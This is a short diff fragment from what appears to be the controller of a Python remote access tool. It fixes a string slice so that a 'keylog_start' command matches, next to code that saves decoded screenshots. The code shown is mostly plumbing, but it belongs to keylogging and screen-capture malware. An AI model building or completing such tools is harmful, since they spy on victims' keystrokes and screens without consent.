@@ -50,7 +50,7 @@ def shell():
                     sc.write(image_decoded)
                     count += 1
 
-        elif command[:11] == "keylog_start":
+        elif command[:12] == "keylog_start":
             continue
         else:
             result = reliable_recv()
